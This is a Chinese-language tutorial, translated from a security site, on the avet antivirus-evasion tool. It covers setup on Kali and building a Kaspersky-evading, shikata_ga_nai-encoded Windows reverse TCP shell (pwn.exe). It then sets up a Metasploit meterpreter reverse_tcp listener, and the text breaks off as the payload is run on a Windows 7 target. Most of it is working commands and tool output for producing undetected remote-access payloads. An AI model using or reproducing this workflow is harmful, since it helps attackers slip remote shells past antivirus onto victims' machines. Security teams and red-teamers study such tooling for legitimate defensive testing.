# 【Blackhat】avet：杀软绕过工具使用教程
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[ **lfty89** ****](http://bobao.360.cn/member/contribute?uid=2905438952)
预估稿费：300RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**0x01 简介**
**avet是一款在github（[
https://github.com/govolution/avet](https://github.com/govolution/avet)
）上的杀软绕过技术工具，同时也是2017亚洲黑帽大会（3月28日-7月31日）/美拉斯维加斯黑帽大会（7月22日-7月27日
PST）的arsnal（https://www.blackhat.com/us-17/arsenal/schedule/index.html）工具之一。**
这里是avet在亚洲黑大上的链接：
[https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool](https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool)
这里是avet在拉斯维加斯黑大上的链接：
[https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet—antivirus-evasion-tool-7908](https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet---antivirus-evasion-tool-7908)
**0x02 环境搭建**
我们在kali中测试使用avet，据avet作者介绍，在使用avet前，需要利用wine安装tdm-gcc，根据作者提供的教程（USING TDM GCC
WITH KALI 2）安装tdm-gcc：
**下载tdm-gcc**
从 下载最新的tdm64-gcc-5.1.0-2.exe
或者在kali中用wget：
    #wget -c --no-check-certificate https://nchc.dl.sourceforge.net/project/tdm-gcc/TDM-GCC%20Installer/tdm64-gcc-5.1.0-2.exe
**安装tdm-gcc**
    #wine tdm64-gcc-5.1.0-2.exe
弹出安装窗口：
选择create->MinGW-w64/TDM64(32-bit and 64-bit)  
默认安装路径C:TDM-GCC-64，之后选择默认镜像及组件，完成安装。
**0x03 使用示例**
**生成载荷**
先从github上下载avet：
    #git clone https://github.com/govolution/avet
进入build目录，可以看到各种类型的payload：
这里我们测试build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh，打开文件编辑：  
将lhost设置成kali的ip，lport为kali监听的端口：
回到上一层目录，这里需要注意一下，从github上下载的项目文件夹中默认有编译过的make_evet和sh_format，但是在使用时如果平台或架构不同的话会可能发生报错，如作者编译发布的make_evet是64位的，而笔者的环境是32位kali，运行报错：
    root@kali:~/Desktop# file make_avet 
    make_avet: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9c06de9a25ab707db3ffc4882cebe862006c2d24, not stripped
所以最好还是重新编译make_evet和sh_format：
    #gcc -o make_avet make_avet.c
    #gcc -o sh_format sh_format.c
下面开始生成payload：
    root@kali:~/Desktop/avet-master# ./build/build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
    Found 1 compatible encoders
    Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 360 (iteration=0)
    x86/shikata_ga_nai succeeded with size 387 (iteration=1)
    x86/shikata_ga_nai succeeded with size 414 (iteration=2)
    x86/shikata_ga_nai chosen with final size 414
    Payload size: 414 bytes
    Final size of c file: 1764 bytes
    tr: warning: an unescaped backslash at end of string is not portable
     ________  ___      ___ _______  _________  
    |   __  |      /  /|  ___ |___   ___ 
       |       /  / |    __/|___   _| 
         __     /  / /    _|/__       
                 / /      _|       
        __ __ __/ /      _______   __
        |__||__||__|/       |_______|   |__|
    Anti Virus Evasion Make Tool by Daniel Sauder
    use -h for help
    write shellcode from scclean.txt to defs.h
最终生成pwn.exe
**测试载荷**  
在kali上运行metasploit、设置本地监听参数、开始监听：
    #msfconsole
    msf > use exploit/multi/handler
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.1.120
    LHOST => 192.168.1.120
    msf exploit(handler) > set LPORT 443
    LPORT => 443
    msf exploit(handler) > exploit -j
在一台32位win7靶机上运行pwn.exe：